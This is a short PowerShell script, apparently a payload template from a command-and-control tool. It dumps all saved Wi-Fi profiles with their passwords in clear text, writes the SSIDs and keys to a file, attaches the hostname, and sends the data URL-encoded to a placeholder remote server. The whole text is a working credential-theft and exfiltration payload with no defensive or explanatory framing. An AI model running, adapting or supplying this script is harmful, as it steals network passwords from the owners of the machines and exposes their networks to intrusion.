netsh wlan export profile key=clear

dir *.xml |% {
$xml=[xml] (get-content $_)
$a= "=`r`n SSID = "+$xml.WLANProfile.SSIDConfig.SSID.name + "`r`n PASS = " +$xml.WLANProfile.MSM.Security.sharedKey.keymaterial
Out-File wifipass.txt -Append -InputObject $a
}

$hostname = hostname
$file = get-content wifipass.txt
Add-Type -AssemblyName System.Web
$credz = [System.Web.HTTPUtility]::UrlEncode("Hostname="+$hostname+"`r`n"+$file)

Invoke-WebRequest -Uri "http://{server_hostname}/remote?id={id}&action=write&val=$credz"
